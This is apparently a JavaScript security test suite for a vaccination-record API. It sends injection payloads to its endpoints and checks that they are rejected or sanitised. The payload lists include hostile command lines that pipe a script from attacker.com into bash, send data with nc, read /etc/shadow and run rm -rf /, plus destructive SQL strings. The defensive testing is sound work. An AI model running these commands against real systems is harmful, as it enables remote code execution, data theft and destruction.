const request = require('supertest');
const app = require('../src/app');
const { jwtFactory } = require('./factories/jwtFactory');

describe('Injection Payload Security Tests', () => {
  let issuerToken;
  let patientToken;
  let adminToken;
  let validWallet;

  beforeAll(async () => {
    // Create valid wallets for baseline testing
    validWallet = 'GBBD47UZQ5CYVDXY2R2ZDTSDGQLW3DJRIGUMNQUNGSMBUI6ZVT76IFAY';
    issuerToken = jwtFactory.create({ role: 'issuer', sub: validWallet });
    patientToken = jwtFactory.create({ role: 'patient', sub: validWallet });
    adminToken = jwtFactory.create({ role: 'admin', sub: validWallet });
  });

  describe('SQL Injection Payloads', () => {
    const sqlInjectionPayloads = [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "' OR 1=1--",
      "admin' --",
      "' UNION SELECT NULL--",
      "1' AND '1'='1",
      "' OR 'x'='x",
      "'; DELETE FROM records; --",
      "' AND 1=1 UNION SELECT * FROM accounts--",
      "' HAVING 1=1--",
      "') UNION ALL SELECT NULL--",
    ];

    describe('POST /vaccination/issue - patient_address', () => {
      sqlInjectionPayloads.forEach((payload) => {
        it(`should reject SQL injection: ${payload}`, async () => {
          const res = await request(app)
            .post('/vaccination/issue')
            .set('Authorization', `Bearer ${issuerToken}`)
            .send({
              patient_address: payload,
              vaccine_name: 'COVID-19',
              date_administered: '2025-01-01',
            });

          // Should reject with 400 (validation error) or 403 (forbidden)
          expect([400, 403]).toContain(res.status);
          expect(res.body.error).toBeDefined();
        });
      });
    });

    describe('GET /verify/:wallet - path parameter', () => {
      sqlInjectionPayloads.forEach((payload) => {
        it(`should reject SQL injection: ${payload}`, async () => {
          const encodedPayload = encodeURIComponent(payload);
          const res = await request(app)
            .get(`/verify/${encodedPayload}`)
            .set('Authorization', `Bearer ${issuerToken}`);

          expect([400, 403, 404]).toContain(res.status);
        });
      });
    });

    describe('DELETE /admin/issuers/:wallet - path parameter', () => {
      sqlInjectionPayloads.forEach((payload) => {
        it(`should reject SQL injection: ${payload}`, async () => {
          const encodedPayload = encodeURIComponent(payload);
          const res = await request(app)
            .delete(`/admin/issuers/${encodedPayload}`)
            .set('Authorization', `Bearer ${adminToken}`);

          expect([400, 403, 404]).toContain(res.status);
        });
      });
    });

    describe('POST /onboarding/apply - wallet field', () => {
      sqlInjectionPayloads.forEach((payload) => {
        it(`should reject SQL injection: ${payload}`, async () => {
          const res = await request(app)
            .post('/onboarding/apply')
            .set('Authorization', `Bearer ${patientToken}`)
            .send({
              wallet: payload,
              name: 'John Doe',
              license_number: 'LIC123',
              country: 'US',
            });

          expect([400, 403]).toContain(res.status);
        });
      });
    });
  });

  describe('Command Injection Payloads', () => {
    const commandInjectionPayloads = [
      '; ls -la',
      '| cat /etc/passwd',
      '$(whoami)',
      '`id`',
      '&& rm -rf /',
      '\n cat /etc/shadow',
      '| nc attacker.com 1234',
      '; curl http://attacker.com',
      '$(curl http://attacker.com/malware.sh | bash)',
      '`id > /tmp/pwned`',
      '; exec sh',
    ];

    describe('POST /vaccination/issue - vaccine_name', () => {
      commandInjectionPayloads.forEach((payload) => {
        it(`should reject command injection: ${payload}`, async () => {
          const res = await request(app)
            .post('/vaccination/issue')
            .set('Authorization', `Bearer ${issuerToken}`)
            .send({
              patient_address: validWallet,
              vaccine_name: payload,
              date_administered: '2025-01-01',
            });

          // Sanitization should strip command sequences
          expect([200, 400]).toContain(res.status);
          if (res.status === 200) {
            // If accepted, verify command sequences are removed
            expect(res.body.vaccine_name || '').not.toMatch(/[;&|`$\(\)]/);
          }
        });
      });
    });

    describe('POST /onboarding/apply - name field', () => {
      commandInjectionPayloads.forEach((payload) => {
        it(`should reject command injection: ${payload}`, async () => {
          const res = await request(app)
            .post('/onboarding/apply')
            .set('Authorization', `Bearer ${patientToken}`)
            .send({
              wallet: validWallet,
              name: payload,
              license_number: 'LIC123',
              country: 'US',
            });

          expect([200, 400]).toContain(res.status);
          if (res.status === 200) {
            // Verify dangerous characters are stripped
            expect((res.body.name || '') + (res.body.applicant_name || '')).not.toMatch(/[;&|`$]/);
          }
        });
      });
    });
  });

  describe('Template Injection Payloads', () => {
    const templateInjectionPayloads = [
      '${7*7}',
      '#{7*7}',
      '{{ 7 * 7 }}',
      '<%= 7*7 %>',
      '{{constructor.prototype.toString()}}',
      '${constructor.prototype.toString()}',
      '#{constructor.prototype}',
      '{{process.env}}',
      '${env.USER}',
      '<%=require("child_process").exec("id")%>',
    ];

    describe('POST /vaccination/issue - vaccine_name', () => {
      templateInjectionPayloads.forEach((payload) => {
        it(`should reject template injection: ${payload}`, async () => {
          const res = await request(app)
            .post('/vaccination/issue')
            .set('Authorization', `Bearer ${issuerToken}`)
            .send({
              patient_address: validWallet,
              vaccine_name: payload,
              date_administered: '2025-01-01',
            });

          expect([200, 400]).toContain(res.status);
          // Should not execute template
          expect(res.body.vaccine_name || '').not.toBe('49');
        });
      });
    });
  });

  describe('XSS/Encoding Injection Payloads', () => {
    const xssPayloads = [
      '<script>alert("xss")</script>',
      '<img src=x onerror="alert(1)">',
      '<svg onload="alert(1)">',
      'javascript:alert(1)',
      '<iframe src="javascript:alert(1)"></iframe>',
      '<body onload="alert(1)">',
      '<input onfocus="alert(1)" autofocus>',
      '"><script>alert(1)</script>',
      '<img src=x alt=test onerror="alert(1)">',
      '<details open ontoggle="alert(1)">',
      '<!--<script>alert(1)</script>-->',
    ];

    describe('POST /vaccination/issue - vaccine_name', () => {
      xssPayloads.forEach((payload) => {
        it(`should sanitize XSS: ${payload}`, async () => {
          const res = await request(app)
            .post('/vaccination/issue')
            .set('Authorization', `Bearer ${issuerToken}`)
            .send({
              patient_address: validWallet,
              vaccine_name: payload,
              date_administered: '2025-01-01',
            });

          expect([200, 400]).toContain(res.status);
          // Verify script tags and event handlers are removed
          const result = res.body.vaccine_name || '';
          expect(result).not.toMatch(/<script|onerror|onload|javascript:/i);
        });
      });
    });

    describe('POST /onboarding/apply - name field', () => {
      xssPayloads.forEach((payload) => {
        it(`should sanitize XSS: ${payload}`, async () => {
          const res = await request(app)
            .post('/onboarding/apply')
            .set('Authorization', `Bearer ${patientToken}`)
            .send({
              wallet: validWallet,
              name: payload,
              license_number: 'LIC123',
              country: 'US',
            });

          expect([200, 400]).toContain(res.status);
          const result = (res.body.name || '') + (res.body.applicant_name || '');
          expect(result).not.toMatch(/<script|onerror|onload|javascript:/i);
        });
      });
    });
  });

  describe('Encoding Bypass Attempts', () => {
    const encodingBypassPayloads = [
      // URL encoding
      '%27%20OR%20%271%27%3D%271',
      // Double encoding
      '%252753%2520OR%25201%253D1',
      // UTF-8 encoding
      '%c0%27 OR %c01%c0=%c01',
      // HTML entities
      '&#39; OR &#39;1&#39;=&#39;1',
      '&apos; OR &apos;1&apos;=&apos;1',
      // Unicode escapes
      '\\u0027 OR \\u00271\\u0027=\\u00271',
      // Hex encoding
      '0x27 OR 0x31',
      // Octal encoding
      '\\047 OR \\061',
    ];

    describe('GET /verify/:wallet - encoded payloads', () => {
      encodingBypassPayloads.forEach((payload) => {
        it(`should reject encoded injection: ${payload}`, async () => {
          const res = await request(app)
            .get(`/verify/${payload}`)
            .set('Authorization', `Bearer ${issuerToken}`);

          expect([400, 403, 404]).toContain(res.status);
        });
      });
    });
  });

  describe('Wallet Address Boundary Testing', () => {
    describe('Invalid wallet lengths', () => {
      it('should reject too short wallet', async () => {
        const res = await request(app)
          .get(`/verify/GBBD47UZ`)
          .set('Authorization', `Bearer ${issuerToken}`);

        expect([400, 403, 404]).toContain(res.status);
      });

      it('should reject too long wallet', async () => {
        const longWallet = 'GBBD47UZQ5CYVDXY2R2ZDTSDGQLW3DJRIGUMNQUNGSMBUI6ZVT76IFAY' + 'EXTRA';
        const res = await request(app)
          .get(`/verify/${encodeURIComponent(longWallet)}`)
          .set('Authorization', `Bearer ${issuerToken}`);

        expect([400, 403, 404]).toContain(res.status);
      });

      it('should reject wallet with invalid character', async () => {
        const invalidWallet = 'GBBD47UZQ5CYVDXY2R2ZDTSDGQLW3DJRIGUMNQUNGSMBUI6ZVT76IFA0'; // 0 invalid
        const res = await request(app)
          .get(`/verify/${invalidWallet}`)
          .set('Authorization', `Bearer ${issuerToken}`);

        expect([400, 403, 404]).toContain(res.status);
      });
    });

    describe('Special characters in wallet field', () => {
      const specialCharPayloads = [
        'GBBD47UZ\x00Q5CYVDXY2R2ZDTSDGQLW3DJRIGUMNQUNGSMBUI6ZVT76IFAY', // null byte
        'GBBD47UZ\nQ5CYVDXY2R2ZDTSDGQLW3DJRIGUMNQUNGSMBUI6ZVT76IFAY', // newline
        'GBBD47UZ\tQ5CYVDXY2R2ZDTSDGQLW3DJRIGUMNQUNGSMBUI6ZVT76IFAY', // tab
        'GBBD47UZ Q5CYVDXY2R2ZDTSDGQLW3DJRIGUMNQUNGSMBUI6ZVT76IFAY', // space
      ];

      specialCharPayloads.forEach((payload) => {
        it(`should reject wallet with special char`, async () => {
          const res = await request(app)
            .get(`/verify/${encodeURIComponent(payload)}`)
            .set('Authorization', `Bearer ${issuerToken}`);

          expect([400, 403, 404]).toContain(res.status);
        });
      });
    });
  });

  describe('Control Character Injection', () => {
    const controlCharPayloads = Array.from({ length: 32 }, (_, i) => String.fromCharCode(i));

    describe('POST /onboarding/apply - name field with control chars', () => {
      controlCharPayloads.forEach((controlChar) => {
        it(`should reject control character 0x${controlChar.charCodeAt(0).toString(16).padStart(2, '0')}`, async () => {
          const payload = `John${controlChar}Doe`;
          const res = await request(app)
            .post('/onboarding/apply')
            .set('Authorization', `Bearer ${patientToken}`)
            .send({
              wallet: validWallet,
              name: payload,
              license_number: 'LIC123',
              country: 'US',
            });

          expect([200, 400]).toContain(res.status);
          // Control chars should be stripped
          const result = (res.body.name || '') + (res.body.applicant_name || '');
          expect(result).not.toMatch(/[\x00-\x08\x0b\x0c\x0e-\x1f]/);
        });
      });
    });
  });

  describe('Null Byte Injection', () => {
    const nullBytePayloads = [
      'vaccine\x00name',
      'GBBD47UZQ5CYVDXY2R2ZDTSDGQLW3DJRIGUMNQUNGSMBUI6ZVT76IFAY\x00extra',
      'John\x00Doe',
      'name%00injection',
    ];

    describe('POST /vaccination/issue', () => {
      nullBytePayloads.forEach((payload) => {
        it(`should reject null byte in vaccine_name: ${JSON.stringify(payload)}`, async () => {
          const res = await request(app)
            .post('/vaccination/issue')
            .set('Authorization', `Bearer ${issuerToken}`)
            .send({
              patient_address: validWallet,
              vaccine_name: payload,
              date_administered: '2025-01-01',
            });

          // Should throw or reject
          expect([400, 500]).toContain(res.status);
        });
      });
    });
  });

  describe('Cross-User/Privilege Escalation Tests', () => {
    it('patient should not access other patient vaccination records', async () => {
      const otherWallet = 'GBRPYHIL2CI3WHZDTOOQFC6EB4WXNUWAY5BWTZ5HOOJA4MC7PUBSTPA7';
      const res = await request(app)
        .get(`/vaccination/${otherWallet}`)
        .set('Authorization', `Bearer ${patientToken}`);

      // Should reject or return empty
      expect([403, 404]).toContain(res.status);
    });

    it('non-admin should not delete issuers', async () => {
      const res = await request(app)
        .delete(`/admin/issuers/${validWallet}`)
        .set('Authorization', `Bearer ${issuerToken}`);

      expect(res.status).toBe(403);
    });
  });

  describe('Date Injection Payloads', () => {
    const dateInjectionPayloads = [
      '2025-01-01T00:00:00Z; DROP TABLE--',
      "2025-01-01'; DELETE FROM vaccinations; --",
      '${new Date()}',
      '2025-01-01\x00extra',
      'invalid-date-format',
      '9999-99-99',
      '1900-00-00',
      '2025-01-01T25:99:99Z',
    ];

    describe('POST /vaccination/issue - date_administered', () => {
      dateInjectionPayloads.forEach((payload) => {
        it(`should reject malformed date: ${payload}`, async () => {
          const res = await request(app)
            .post('/vaccination/issue')
            .set('Authorization', `Bearer ${issuerToken}`)
            .send({
              patient_address: validWallet,
              vaccine_name: 'COVID-19',
              date_administered: payload,
            });

          expect([400, 403]).toContain(res.status);
        });
      });
    });
  });

  describe('LDAP Injection Payloads', () => {
    const ldapInjectionPayloads = [
      '*',
      '*)',
      'admin*',
      '*)(uid=*',
      'admin)(&(uid=admin',
      '*)(|(uid=*',
      'admin*))%00',
    ];

    describe('POST /onboarding/apply - license_number', () => {
      ldapInjectionPayloads.forEach((payload) => {
        it(`should reject LDAP injection: ${payload}`, async () => {
          const res = await request(app)
            .post('/onboarding/apply')
            .set('Authorization', `Bearer ${patientToken}`)
            .send({
              wallet: validWallet,
              name: 'John Doe',
              license_number: payload,
              country: 'US',
            });

          expect([200, 400]).toContain(res.status);
        });
      });
    });
  });

  describe('NoSQL Injection Payloads', () => {
    const noSqlPayloads = [
      { $ne: null },
      { $gt: '' },
      { $exists: true },
      '{"$ne": null}',
      '{"$where": "1==1"}',
      { $where: '1==1' },
      '{"$or": [{}]}',
    ];

    describe('POST /vaccination/issue - JSON serialization', () => {
      noSqlPayloads.forEach((payload) => {
        it(`should safely handle NoSQL-like payload: ${JSON.stringify(payload)}`, async () => {
          const res = await request(app)
            .post('/vaccination/issue')
            .set('Authorization', `Bearer ${issuerToken}`)
            .send({
              patient_address: validWallet,
              vaccine_name: typeof payload === 'string' ? payload : JSON.stringify(payload),
              date_administered: '2025-01-01',
            });

          expect([200, 400]).toContain(res.status);
        });
      });
    });
  });

  describe('Regex DoS (ReDoS) Payloads', () => {
    const redosPayloads = [
      'a'.repeat(1000),
      '(a+)+'.repeat(100),
      '(a|a)*'.repeat(50),
      '(.*)*'.repeat(50),
      'x'.repeat(10000),
    ];

    describe('POST /onboarding/apply - name field', () => {
      redosPayloads.forEach((payload) => {
        it(`should handle ReDoS payload: length=${payload.length}`, async () => {
          const res = await request(app)
            .post('/onboarding/apply')
            .set('Authorization', `Bearer ${patientToken}`)
            .send({
              wallet: validWallet,
              name: payload,
              license_number: 'LIC123',
              country: 'US',
            });

          expect([200, 400, 413]).toContain(res.status);
        });
      });
    });
  });

  describe('Stellar Contract Injection Payloads', () => {
    const contractInjectionPayloads = [
      '"; unauthorized_op(); "',
      'CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWHF',
      '0x' + 'a'.repeat(256),
      'AAAAgAAAAA=' + '='.repeat(100),
    ];

    describe('Malformed contract IDs', () => {
      contractInjectionPayloads.forEach((payload) => {
        it(`should reject invalid contract ID: ${payload.substring(0, 30)}...`, async () => {
          const res = await request(app)
            .post('/vaccination/issue')
            .set('Authorization', `Bearer ${issuerToken}`)
            .query({ contract_id: payload })
            .send({
              patient_address: validWallet,
              vaccine_name: 'COVID-19',
              date_administered: '2025-01-01',
            });

          // Query params may not be used, but test defensively
          expect([200, 400, 403]).toContain(res.status);
        });
      });
    });
  });
});
